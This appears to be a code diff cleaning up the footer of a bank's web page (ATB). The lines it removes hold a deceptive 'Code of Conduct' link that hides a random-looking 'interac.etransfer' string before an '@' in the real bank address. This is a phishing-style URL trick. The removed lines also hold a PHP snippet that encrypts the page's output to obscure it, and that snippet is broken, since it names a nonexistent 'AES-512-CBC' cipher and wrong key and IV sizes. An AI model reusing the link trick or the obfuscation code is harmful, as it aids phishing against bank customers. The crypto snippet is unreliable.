-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/siteassets/pdf/global/codeofconduct.pdf" aria-label="Code of Conduct"><span tabindex="-1">Code of Conduct</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/company/legal/" aria-label="Legal"><span tabindex="-1">Legal</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/company/privacy-and-security/" aria-label="Privacy &amp; security"><span tabindex="-1">Privacy &amp; security</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/siteassets/pdf/global/codeofconduct.pdf" aria-label="Code of Conduct"><span tabindex="-1">Code of Conduct</span></a></li>
                 </ul>
             </section>
             <div class="copyright">Copyright © 2023 ATB. All rights reserved.</div>
@@ -596,13 +571,3 @@ if(typeof FindApi === 'function'){var api = new FindApi();api.setApplicationUrl(
 
 
 </body></html>
-<?php
-// Generate a random encryption key and initialization vector
-$key = openssl_random_pseudo_bytes(64); // 512-bit key
-$iv = openssl_random_pseudo_bytes(64); // 512-bit IV
-
-// Capture the output buffer and encrypt it
-$encrypted_html = openssl_encrypt(ob_get_clean(), 'AES-512-CBC', $key, 0, $iv);
-
-// Output the encrypted HTML code to the browser
-echo $encrypted_html;
